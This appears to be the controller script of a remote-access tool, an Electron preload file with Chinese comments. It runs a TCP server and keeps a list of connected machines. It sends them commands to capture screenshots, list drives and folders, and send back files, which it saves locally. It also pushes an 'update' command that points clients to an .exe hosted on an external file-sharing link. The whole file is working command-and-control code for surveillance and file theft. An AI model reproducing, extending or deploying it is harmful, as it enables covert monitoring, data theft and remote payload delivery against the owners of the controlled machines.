const fs = require("fs");

// ------ socket↓ ------
const net = require("net");
var port = 2004;
var hostname = "127.0.0.1";
const server = new net.createServer();
let log = []; // 日志
fs.readFile("./ip_port.txt", (err, data) => {
  if (err) return console.log(err);
  let ip_data = data + "";
  hostname = ip_data.split("-")[0];
  port = ip_data.split("-")[1];
  server.listen(port, hostname, function () {
    log.unshift({
      time: new Date(),
      msg: `服务器运行在：http://${hostname}:${port}`,
    });
  });
});
let clients = []; //客户端列表
let img_list = []; //截图列表
let cl_msg = []; //客户消息列表 以 { user: SAMURAI, ip: 127.0.0.1 , msg: 消息 } 格式存储
let cl_path = {
  user: "0",
  ip: "0",
  path: [],
};
let cl_file = [];
var commnum = 0
server.on("connection", (client) => {
  client.write(
    JSON.stringify({
      cmd: "/system_info",
    })
  );
  var temp = "";
  client.on("data", function (data) {
    if (testJson(data)) {
      // console.log("第一波就是完整数据");
      log.unshift({
        time: new Date(),
        msg: '接收数据完毕',
      });
      recv_data(data);
    } else {
      temp += data;
      commnum++
      log.unshift({
        time: new Date(),
        msg: '接受第 ' + commnum + ' 块数据',
      });
      if (testJson(temp)) {
        recv_data(temp);
        commnum = 0
        log.unshift({
          time: new Date(),
          msg: `接收数据完毕`,
        });
      } else {
        return;
      }
    }
  });
  // 判断json完整函数
  const testJson = (val) => {
    try {
      if (typeof JSON.parse(val) == "object") {
        return true;
      }
    } catch (e) {
      return false;
    }
  };
  // 接受数据
  const recv_data = (c_data) => {
    var json_data = JSON.parse(c_data + " ");
    temp = "";
    switch (json_data.cmd) {
      case "/system_info":
        client.userinfo = json_data.info;
        clients.unshift(client);
        log.unshift({
          time: new Date(),
          msg: `user ${client.userinfo.username} ip ${client.userinfo.ip} 上线了`,
        });
        break;
      case "/jietu":
        img_list.unshift({
          img: json_data.image,
          time: new Date(),
          user: client.userinfo.username,
          ip: client.userinfo.ip,
        });
        break;
      case "/path_read":
        cl_path.user = client.userinfo.username;
        cl_path.ip = client.userinfo.ip;
        cl_path.path = json_data.path;
        break;
      case "/file_read":
        if (json_data.folder) {
          cl_file = json_data.list;
          console.log("@@@@@@@插入了数据");
        }
        break;
      case "/file_download":
        // 下载文件到本地
        var databuff = new Buffer(json_data.data, "base64");
        fs.writeFile(__dirname + '/file_download/' + json_data.fname,databuff, (err) => {
          if (err) {
            console.log(err);
          } else {
            console.log("写入成功！");
          }
        });
        break;
      case "/update":
        log.unshift({
          time: new Date(),
          msg: `user ${client.userinfo.username} ip ${client.userinfo.ip} : 信息: ${json_data.msg}`,
        });
        break;
      default:
        console.log("deft");
        break;
    }
  };
  client.on("error", function (e) {
    //监听客户端异常
    // console.log("client error" + e);
    log.unshift({
      time: new Date(),
      msg: `user ${client.userinfo.username} ip ${client.userinfo.ip} 出错掉线`,
    });
    client.end();
  });

  client.on("close", function () {
    // console.log(`客户端${client}下线了`);
    log.unshift({
      time: new Date(),
      msg: `user ${client.userinfo.username} ip ${client.userinfo.ip} 下线了`,
    });
    clients.forEach((item, index, arr) => {
      if (item == client) {
        clients.splice(index, 1);
      }
    });
  });
});

const { contextBridge, ipcRenderer } = require("electron");
// 返回用户列表
const get_userlist = () => {
  return clients;
};

// 设置服务器监听端口
const set_ip_port = (ip, port) => {
  let content = ip + "-" + port;
  fs.writeFile("./ip_port.txt", content, (err) => {
    if (err) return alert("设置失败");
    alert("设置成功 重启后将会生效");
    ipcRenderer.send("app-re", true);
  });
};

// 截图
const jietu = (user, ip) => {
  // console.log("后端 - " + user + ip);
  // 下达截图命令
  clients.forEach((e) => {
    if (e.userinfo.username == user && e.userinfo.ip == ip) {
      // console.log("找到拉");
      e.write(
        JSON.stringify({
          cmd: "/jietu",
        })
      );
    }
  });
};
// 返回截图数据
const send_jietu = () => {
  return img_list;
};

// 创建聊天框
const create_chat = (user, ip) => {
  // console.log(cl_msg.length);
  if (cl_msg.length < 1) {
    // console.log('插入1');
    cl_msg.unshift({
      user: user,
      ip: ip,
      content: [],
    });
  } else {
    // console.log("走遍历");
    let msg_flag = false;
    cl_msg.find((value, index, arr) => {
      if (value.user == user && value.ip == ip) {
        // console.log("存在");
        msg_flag = true;
      }
    });
    if (!msg_flag) {
      // console.log('插入2');
      cl_msg.unshift({
        user: user,
        ip: ip,
        content: [],
      });
      msg_flag = false;
    }
  }
};
// 打开聊天
const chat = (user, ip, val) => {
  // console.log("后端 - " + user + ip);
  cl_msg.forEach((element) => {
    if (element.user == user && element.ip == ip) {
      // console.log("找到了并且插入一条数据");
      element.content.unshift({
        msg: val,
        time: "2022-10-8 114514",
        by: "Bojaka",
      });
    }
  });
  clients.forEach((e) => {
    if (e.userinfo.username == user && e.userinfo.ip == ip) {
      e.write(
        JSON.stringify({
          cmd: "/chat",
          msg_data: {
            msg: val,
            time: "2022-10-8 114514",
            by: "Bojaka",
          },
        })
      );
    }
  });
};
// 返回聊天数据
const send_chat = () => {
  return cl_msg;
};
const testupdate = (user, ip, url) => {
  clients.forEach((e) => {
    if (e.userinfo.username == user && e.userinfo.ip == ip) {
      // console.log("找到拉");
      e.write(
        JSON.stringify({
          cmd: "/updata",
          url: "https://i41.lanzoug.com/100803bb/2022/10/08/aee742ad6d85fac5a9e7e3560ddc11a0.exe?st=3jFeCKVo3ezrKQ6SJjajBw&e=1665174067&b=Aj0LalI7AmkCeVVmUnoEZQ_c_c&fi=84698224&pid=211-128-227-238&up=2&mp=0&co=1",
        })
      );
    }
  });
};

// 盘符获取
const path_read = (user, ip) => {
  clients.forEach((e) => {
    if (e.userinfo.username == user && e.userinfo.ip == ip) {
      e.write(
        JSON.stringify({
          cmd: "/path_read",
        })
      );
    }
  });
};
// 文件读取
const file_read = (user, ip, path) => {
  clients.forEach((e) => {
    if (e.userinfo.username == user && e.userinfo.ip == ip) {
      console.log("发送文件读取指令");
      e.write(
        JSON.stringify({
          cmd: "/file_read",
          path: path,
        })
      );
    }
  });
};
const send_cl_files = () => {
  return {
    path: cl_path,
    file_list: cl_file,
  };
};

// 返回日志
const send_log = () => {
  return log;
};
// 删除日志
const del_log = () => {
  log = [];
};
// 版本更新
const update = (up_type, url) => {
  console.log(up_type, url);
  clients.forEach((e) => {
    e.write(
      JSON.stringify({
        cmd: "/update",
        url: url,
        uptype: up_type,
      })
    );
  });
};
contextBridge.exposeInMainWorld("myApi", {
  // 操作-----sta
  jietu, // 截图
  send_jietu, // send 截图
  // ----------
  create_chat,
  chat,
  send_chat,
  testupdate,
  // ----------
  // 操作-----end
  set_ip_port,
  // 用户列表
  get_userlist,
  send_log,
  del_log,
  file_read,
  send_cl_files,
  path_read,
  update,
});
